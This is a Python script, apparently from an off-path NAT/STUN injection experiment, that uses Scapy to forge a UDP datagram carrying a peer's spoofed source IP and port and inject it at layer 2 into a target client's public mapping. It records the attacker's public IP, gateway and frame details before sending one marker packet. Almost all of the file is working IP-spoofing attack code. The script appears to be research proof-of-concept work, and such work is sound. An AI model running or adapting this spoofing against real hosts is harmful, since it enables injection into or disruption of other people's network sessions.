#!/usr/bin/env python3
"""Send exactly one forged-source UDP marker using Scapy L2 injection on macOS."""
import json, pathlib, subprocess, sys, time
from scapy.all import Ether, IP, UDP, Raw, sendp, get_if_hwaddr, getmacbyip

out = pathlib.Path("offpath-stun-results")
out.mkdir(parents=True, exist_ok=True)
mapping_path = out / "mapping.json"
deadline = time.time() + 240
while not mapping_path.exists() and time.time() < deadline:
    time.sleep(1)
if not mapping_path.exists():
    raise SystemExit("TIMEOUT waiting for published target mapping")

m = json.loads(mapping_path.read_text())
try:
    attacker_ip = subprocess.run(
        ["curl", "-4", "--connect-timeout", "5", "--max-time", "10", "-fsS", "https://api.ipify.org"],
        capture_output=True, text=True, timeout=15
    ).stdout.strip() or "UNKNOWN"
except Exception:
    attacker_ip = "UNKNOWN"

if attacker_ip in (m["client_public_ip"], m["peer_ip"]):
    raise SystemExit("FAIL: attacker, target, and peer must have distinct public IPs")

route = subprocess.check_output(["route", "-n", "get", "default"], text=True)
iface = next((line.split(":", 1)[1].strip() for line in route.splitlines() if line.strip().startswith("interface:")), None)
gateway = next((line.split(":", 1)[1].strip() for line in route.splitlines() if line.strip().startswith("gateway:")), None)
if not iface or not gateway:
    raise SystemExit(f"FAIL: cannot determine default interface/gateway: {route}")

src_mac = get_if_hwaddr(iface)
dst_mac = getmacbyip(gateway)
if not dst_mac:
    raise SystemExit(f"FAIL: cannot resolve gateway MAC {gateway} on {iface}")

payload = b"OFFPATH-DELIVERY-PROOF"
frame = (
    Ether(src=src_mac, dst=dst_mac)
    / IP(src=m["peer_ip"], dst=m["client_public_ip"], ttl=64, id=0x5350)
    / UDP(sport=int(m["peer_port"]), dport=int(m["client_public_port"]))
    / Raw(load=payload)
)
wire = bytes(frame)
check = Ether(wire)
if len(wire) != 14 + 20 + 8 + len(payload):
    raise SystemExit(f"FAIL: unexpected L2 frame length {len(wire)}")
if check[IP].len != 20 + 8 + len(payload):
    raise SystemExit(f"FAIL: bad IPv4 total length {check[IP].len}")
if check[IP].chksum is None or check[UDP].chksum is None:
    raise SystemExit("FAIL: missing computed IPv4/UDP checksums")

identity = {
    "attacker_public_ip": attacker_ip,
    "attacker_interface": iface,
    "attacker_gateway": gateway,
    "spoofed_source": f'{m["peer_ip"]}:{m["peer_port"]}',
    "controlled_target": f'{m["client_public_ip"]}:{m["client_public_port"]}',
    "datagrams_sent": 1,
    "payload_hex": payload.hex(),
    "ethernet_frame_bytes": len(wire),
    "ipv4_total_length": check[IP].len,
    "ipv4_header_checksum": hex(check[IP].chksum),
    "udp_checksum": hex(check[UDP].chksum),
    "injection_method": "Scapy sendp L2/pcap"
}
(out / "attacker-macos.json").write_text(json.dumps(identity, indent=2) + "\n")
print("ATTACK_IDENTITY=" + json.dumps(identity, sort_keys=True), flush=True)

sent = sendp(frame, iface=iface, count=1, verbose=False)
print(f"SENDP_RETURN={sent!r} COUNT=1 FRAME_BYTES={len(wire)}", flush=True)
